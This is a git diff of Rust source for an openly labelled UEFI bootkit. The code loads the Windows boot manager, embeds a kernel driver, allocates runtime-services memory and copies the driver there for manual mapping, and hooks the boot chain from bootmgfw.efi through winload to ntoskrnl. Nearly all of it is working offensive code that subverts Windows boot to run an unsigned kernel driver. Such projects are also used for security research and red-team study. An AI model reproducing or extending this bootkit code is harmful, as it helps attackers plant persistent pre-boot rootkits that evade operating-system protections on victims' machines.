@@ -4,27 +4,28 @@
 #![feature(panic_info_message)]
 #![feature(offset_of)]
 
-use log::{error, LevelFilter};
-use uefi::{prelude::*};
-use crate::boot::globals::{DRIVER_ADDRESS, DRIVER_LENGTH};
+use core::ptr::copy_nonoverlapping;
+
+use log::{LevelFilter};
+use uefi::{prelude::*, table::boot::{MemoryType, AllocateType}};
+use crate::{boot::globals::{DRIVER_PHYSICAL_MEMORY, DRIVER_IMAGE_SIZE}, mapper::get_nt_headers};
 
 mod boot;
-
-#[lang = "eh_personality"]
-fn eh_personality() {}
+mod mapper;
 
 // Change as you like
+#[cfg(not(test))]
 #[panic_handler]
 fn panic_handler(info: &core::panic::PanicInfo) -> ! {
     if let Some(location) = info.location() {
-        error!(
+        log::error!(
             "[-] Panic in {} at ({}, {}):",
             location.file(),
             location.line(),
             location.column()
         );
         if let Some(message) = info.message() {
-            error!("[-] {}", message);
+            log::error!("[-] {}", message);
         }
     }
 
@@ -49,10 +50,8 @@ fn efi_main(image_handle: Handle, system_table: SystemTable<Boot>) -> Status {
     /* Setup a logger with the default settings. The default settings is COM1 port with level filter Info */
     //com_logger::init();
 
-    com_logger::builder()
-    .base(0x2f8)                  // Use COM2 port
-    .filter(LevelFilter::Info)   // Print Info log
-    .setup();
+    // Use COM2 port and print Info log
+    com_logger::builder().base(0x2f8).filter(LevelFilter::Info).setup();
 
     log::info!("### UEFI Bootkit in Rust by memN0ps ###");
     
@@ -64,21 +63,25 @@ fn efi_main(image_handle: Handle, system_table: SystemTable<Boot>) -> Status {
     let bootmgfw_handle = boot::pe::load_windows_boot_manager(boot_services).expect("Failed to load image");
     log::info!("[+] Image Loaded Successfully!");
 
-    // Read Windows kernel driver from disk as bytes (save the address in a global variable for BlImgAllocateImageBuffer)
-    let driver_bytes = include_bytes!("../../target/x86_64-pc-windows-msvc/debug/lol.sys");
-    unsafe { DRIVER_ADDRESS = driver_bytes.as_ptr() as u64 };
-    unsafe { DRIVER_LENGTH = driver_bytes.len() as u64 };
-    log::info!("Driver address: {:#x}", unsafe { DRIVER_ADDRESS });
-    log::info!("Driver size: {:#x}", unsafe { DRIVER_LENGTH });
+    // Read Windows kernel driver from disk as bytes and data in global variable for later
+    let mut driver_bytes = include_bytes!("../../target/x86_64-pc-windows-msvc/debug/lol.sys").to_vec();
+    
+    log::info!("Driver Bytes Address: {:#p}", driver_bytes.as_mut_ptr());
+    log::info!("Driver Bytes Len: {:#x}", driver_bytes.len());
 
-    /* (Not requred if using above for BlImgAllocateImageBuffer)
-    /* Allocates memory pages from the system for the Windows kernel driver to manually map*/
+    let nt_headers = unsafe { get_nt_headers(driver_bytes.as_mut_ptr()).unwrap() };
+    log::info!("Driver SizeOfImage: {:#x}", unsafe { (*nt_headers).OptionalHeader.SizeOfImage as u64 });
+    unsafe { DRIVER_IMAGE_SIZE = (*nt_headers).OptionalHeader.SizeOfImage as u64 };
+
+    /* Allocates memory pages from the system for the Windows kernel driver to manually map */
     unsafe {
-        DRIVER_MEMORY = boot_services.allocate_pages(AllocateType::AnyPages, MemoryType::RUNTIME_SERVICES_CODE, (driver_bytes.len() - 1) / 4096 + 1)
-            .expect("Failed to allocate memory pages")
+        DRIVER_PHYSICAL_MEMORY = boot_services.allocate_pages(AllocateType::AnyPages, MemoryType::RUNTIME_SERVICES_CODE, size_to_pages(driver_bytes.len()))
+            .expect("Failed to allocate memory pages");
+        log::info!("Allocated memory pages for the driver at: {:#x}", DRIVER_PHYSICAL_MEMORY);
     }
-    log::info!("Allocated memory pages for the driver at: {:#x}", unsafe { DRIVER_MEMORY });
-    */
+
+    // Copy driver
+    unsafe { copy_nonoverlapping(driver_bytes.as_mut_ptr(), DRIVER_PHYSICAL_MEMORY as *mut u8, driver_bytes.len()) };
 
     /* Set up the hook chain from bootmgfw.efi -> windload.efi -> ntoskrnl.exe */
     boot::hooks::setup_hooks(&bootmgfw_handle, boot_services).expect("Failed to setup hooks");
@@ -93,4 +96,14 @@ fn efi_main(image_handle: Handle, system_table: SystemTable<Boot>) -> Status {
     boot_services.start_image(bootmgfw_handle).expect("[-] Failed to start image");
 
     Status::SUCCESS
+}
+
+pub const BASE_PAGE_SHIFT: usize = 12;
+
+/// Credits to tandasat: https://github.com/tandasat/Hypervisor-101-in-Rust/blob/5e7befc39b915c555f19e71bfb98ed9e8339eb51/hypervisor/src/main.rs#L196
+/// Computes how many pages are needed for the given bytes.
+fn size_to_pages(size: usize) -> usize {
+    const PAGE_MASK: usize = 0xfff;
+
+    (size >> BASE_PAGE_SHIFT) + usize::from((size & PAGE_MASK) != 0)
 }
